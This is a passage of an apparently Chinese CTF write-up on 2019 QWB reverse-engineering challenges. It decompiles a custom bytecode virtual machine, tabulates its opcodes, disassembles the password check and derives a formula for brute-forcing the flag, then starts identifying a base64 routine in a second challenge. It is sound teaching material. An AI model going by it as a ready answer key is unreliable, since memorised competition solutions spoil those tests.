  tran_pass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>arr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//指向虚拟机状态结构体 short[40]数组</span>
  tran_const <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>arr <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//指向虚拟机状态 保存常量的int[32]数组</span>
  <span class="token keyword">do</span> <span class="token punctuation">{</span>
    uVar2 <span class="token operator">=</span> <span class="token operator">*</span>const_ARR<span class="token punctuation">;</span><span class="token comment">//取040数组当前量</span>
    const_ARR <span class="token operator">=</span> const_ARR <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//指针指向下一个</span>
    <span class="token operator">*</span>tran_pass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span><span class="token operator">*</span>_pass<span class="token punctuation">;</span><span class="token comment">//取密码数组第一个 拓宽到short放入short数组</span>
    _pass <span class="token operator">=</span> _pass <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//密码指针指向下一个</span>
    <span class="token operator">*</span>tran_const <span class="token operator">=</span> uVar2<span class="token punctuation">;</span><span class="token comment">//常量数组放入040数组的一个量</span>
    tran_pass <span class="token operator">=</span> tran_pass <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//移动放密码的指针</span>
    tran_const <span class="token operator">=</span> tran_const <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//移动常量的指针</span>
  <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>const_ARR <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>null_ARRAY_ARRAY_004110c0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//实际复制040到0c0 32轮</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>arr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x4110c0</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>arr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x4111c0</span><span class="token punctuation">;</span>
  iVar1 <span class="token operator">=</span> <span class="token function">FUN_00400800</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//虚拟机执行</span>
  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><p>通过分析函数 FUN_00400800，确定了以下内容，其中，如果某条指令的“条件标记”不为零，那么在执行指令之前会检查此处的条件标记和 p 判零寄存器是否相等
arr 结构</p> <table><thead><tr><th>偏移</th> <th>类型</th> <th>名称</th> <th>用途</th></tr></thead> <tbody><tr><td>0x00</td> <td>int</td> <td>X</td> <td>指令指针寄存器</td></tr> <tr><td>0x04</td> <td>int</td> <td>ZF</td> <td>判零寄存器</td></tr> <tr><td>0x08</td> <td>CODE*</td> <td>4110c0</td> <td>代码指针</td></tr> <tr><td>0x0c</td> <td>int*</td> <td>4111c0</td> <td>变量空间</td></tr> <tr><td>0x10</td> <td>short[40]</td> <td>tran_pass</td> <td>密码扩充成 short</td></tr> <tr><td>0x60</td> <td>int[32]</td> <td>const_ARR</td> <td>411040 中的常量</td></tr></tbody></table> <p>虚拟机指令</p> <table><thead><tr><th>操作码</th> <th>条件标记</th> <th>第一参数</th> <th>第二参数</th></tr></thead> <tbody><tr><td>1 字节</td> <td>1 字节</td> <td>2 字节</td> <td>2 字节</td></tr></tbody></table> <p>VM 中模拟的寄存器有以下几个：
返回值 AX 指令位置 IP 通用寄存器 R0-R9RA-RF 判零寄存器 ZF
下面是逆向出的指令 (符号为之后的伪码部分使用的助记符)</p> <table><thead><tr><th>操作码</th> <th>符号</th> <th>num1</th> <th>num2</th> <th>行为</th></tr></thead> <tbody><tr><td>0x01</td> <td>add</td> <td>寄存器</td> <td>寄存器</td> <td>num1+=num2</td></tr> <tr><td>0x02</td> <td>sub</td> <td>寄存器</td> <td>寄存器</td> <td>num1-=num2</td></tr> <tr><td>0x03</td> <td>cmp</td> <td>寄存器</td> <td>寄存器</td> <td>ZF=(num1==num2?1:2)</td></tr> <tr><td>0x04</td> <td>jmp</td> <td><strong>立即数</strong></td> <td>-</td> <td>IP+=num1</td></tr> <tr><td>0x05</td> <td>mov</td> <td>寄存器</td> <td>寄存器</td> <td>num1=num2</td></tr> <tr><td>0x06</td> <td>-</td> <td>寄存器</td> <td>-</td> <td>num1=IP</td></tr> <tr><td>0x07</td> <td>-</td> <td>寄存器</td> <td>-</td> <td>IP=num1</td></tr> <tr><td>0x08</td> <td>-</td> <td>寄存器</td> <td><strong>立即数</strong></td> <td>num1=nmu2</td></tr> <tr><td>0x09</td> <td>ret</td> <td>-</td> <td>-</td> <td>返回 0</td></tr> <tr><td>0x0A</td> <td>load</td> <td>寄存器</td> <td>寄存器</td> <td>num1=tran_pass[num2]</td></tr> <tr><td>0x0B</td> <td>load</td> <td>寄存器</td> <td>寄存器</td> <td>num1=const_ARR[num2]</td></tr> <tr><td>0x0C</td> <td>xor</td> <td>寄存器</td> <td>寄存器</td> <td>num1^=num2</td></tr> <tr><td>0x0D</td> <td>imul</td> <td>寄存器</td> <td>寄存器</td> <td>num1*=num2</td></tr> <tr><td>0x0E</td> <td>DIV</td> <td>寄存器</td> <td>寄存器</td> <td>num1/=num2</td></tr> <tr><td>0x0F</td> <td>shl</td> <td>寄存器</td> <td>寄存器</td> <td>num1&lt;&lt;=num2</td></tr> <tr><td>0x10</td> <td>shr</td> <td>寄存器</td> <td>寄存器</td> <td>num1&gt;&gt;=num2</td></tr> <tr><td>0xFF</td> <td>ret</td> <td>-</td> <td>-</td> <td>返回 1</td></tr></tbody></table> <p>然后根据这些内容分析 4110c0 中的代码，得到：</p> <table><thead><tr><th style="text-align:right;">地址</th> <th style="text-align:center;">数据</th> <th style="text-align:left;">指令</th></tr></thead> <tbody><tr><td style="text-align:right;">004110c0</td> <td style="text-align:center;">08 00 00 00 20 00</td> <td style="text-align:left;">mov R0, 0x20</td></tr> <tr><td style="text-align:right;">004110c6</td> <td style="text-align:center;">08 00 01 00 00 00</td> <td style="text-align:left;">mov R1, 0x00</td></tr> <tr><td style="text-align:right;">004110cc</td> <td style="text-align:center;">08 00 02 00 01 00</td> <td style="text-align:left;">mov R2, 0x01</td></tr> <tr><td style="text-align:right;">004110d2</td> <td style="text-align:center;">03 00 01 00 00 00</td> <td style="text-align:left;">cmp R1, R0</td></tr> <tr><td style="text-align:right;">004110d8</td> <td style="text-align:center;">04 01 16 00 00 00</td> <td style="text-align:left;">jz +0x16</td></tr> <tr><td style="text-align:right;">004110de</td> <td style="text-align:center;">08 00 0b 00 00 00</td> <td style="text-align:left;">mov RB, 0x00</td></tr> <tr><td style="text-align:right;">004110e4</td> <td style="text-align:center;">08 00 0c 00 00 00</td> <td style="text-align:left;">mov RB, 0x00</td></tr> <tr><td style="text-align:right;">004110ea</td> <td style="text-align:center;">01 00 0c 00 0b 00</td> <td style="text-align:left;">add RB, RB</td></tr> <tr><td style="text-align:right;">004110f0</td> <td style="text-align:center;">03 00 0b 00 01 00</td> <td style="text-align:left;">cmp RB, R1</td></tr> <tr><td style="text-align:right;">004110f6</td> <td style="text-align:center;">01 00 0b 00 02 00</td> <td style="text-align:left;">add RB, R2</td></tr> <tr><td style="text-align:right;">004110fc</td> <td style="text-align:center;">04 02 fc ff 00 00</td> <td style="text-align:left;">jnz -0x04</td></tr> <tr><td style="text-align:right;">00411102</td> <td style="text-align:center;">08 00 03 00 08 00</td> <td style="text-align:left;">mov R3, 0x08</td></tr> <tr><td style="text-align:right;">00411108</td> <td style="text-align:center;">08 00 04 00 06 00</td> <td style="text-align:left;">mov R4, 0x06</td></tr> <tr><td style="text-align:right;">0041110e</td> <td style="text-align:center;">08 00 09 00 10 00</td> <td style="text-align:left;">mov R9, 0x10</td></tr> <tr><td style="text-align:right;">00411114</td> <td style="text-align:center;">0f 00 09 00 03 00</td> <td style="text-align:left;">shl R9, R3</td></tr> <tr><td style="text-align:right;">0041111a</td> <td style="text-align:center;">08 00 0a 00 24 00</td> <td style="text-align:left;">mov Ra, 0x24</td></tr> <tr><td style="text-align:right;">00411120</td> <td style="text-align:center;">01 00 09 00 0a 00</td> <td style="text-align:left;">add R9, Ra</td></tr> <tr><td style="text-align:right;">00411126</td> <td style="text-align:center;">01 00 09 00 0c 00</td> <td style="text-align:left;">add R9, RB</td></tr> <tr><td style="text-align:right;">0041112c</td> <td style="text-align:center;">0a 00 05 00 01 00</td> <td style="text-align:left;">LOAD R5, R1 //_pass</td></tr> <tr><td style="text-align:right;">00411132</td> <td style="text-align:center;">0d 00 05 00 09 00</td> <td style="text-align:left;">imul R5, R9</td></tr> <tr><td style="text-align:right;">00411138</td> <td style="text-align:center;">05 00 06 00 05 00</td> <td style="text-align:left;">mov R6, R5</td></tr> <tr><td style="text-align:right;">0041113e</td> <td style="text-align:center;">10 00 06 00 04 00</td> <td style="text-align:left;">shr R6, R4</td></tr> <tr><td style="text-align:right;">00411144</td> <td style="text-align:center;">0b 00 07 00 01 00</td> <td style="text-align:left;">LOAD R7, R1 //_const</td></tr> <tr><td style="text-align:right;">0041114a</td> <td style="text-align:center;">03 00 06 00 07 00</td> <td style="text-align:left;">cmp R6, R7</td></tr> <tr><td style="text-align:right;">00411150</td> <td style="text-align:center;">01 00 01 00 02 00</td> <td style="text-align:left;">add R1, R2</td></tr> <tr><td style="text-align:right;">00411156</td> <td style="text-align:center;">04 01 e9 ff 00 00</td> <td style="text-align:left;">jz -0x17</td></tr> <tr><td style="text-align:right;">0041115c</td> <td style="text-align:center;">04 02 01 00 00 00</td> <td style="text-align:left;">jnz +1</td></tr> <tr><td style="text-align:right;">00411162</td> <td style="text-align:center;">ff 00 00 00 00 00</td> <td style="text-align:left;">ret 1</td></tr> <tr><td style="text-align:right;">00411168</td> <td style="text-align:center;">09 00 00 00 00 00</td> <td style="text-align:left;">ret 0</td></tr> <tr><td style="text-align:right;">0041116e</td> <td style="text-align:center;">ff 00 00 00 00 00</td> <td style="text-align:left;">ret 1</td></tr></tbody></table> <p>分析这份代码，逻辑大约如下，爆破拿 flag(直接除法算好像莫名有点误差)</p> <p><code>const_ARR[i]=(((0x10&lt;&lt;8)+0x24+((i)*(i+1))//2 )*tran_pass[i])&gt;&gt;6</code></p> <p><img src="/assets/img/2019-qwb-re6.4e968d5b.jpg" alt=""></p> <h2 id="强网先锋-ad"><a href="#强网先锋-ad" class="header-anchor">#</a> 强网先锋-AD</h2> <p>直接拖入 ida，查看字符串，发现</p> <p><img src="data:image/png;base64,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" alt=""></p> <p><img src="/assets/img/2019-qwb-re8.73bf1bb7.png" alt=""></p> <p>我们的输入经过 sub_4005b7 变换之后的结果和已有常量相等就可以通过。
在这个 sub 当中，可以看到和标准 base64 特征很像的块：
&lt;&lt; 2，4，6，又是前面字符串中 ABCD…+/的表，可以判断是应该是一个 base64，先直接按照标准的进行解密：</p> <p><img src="data:image/png;base64,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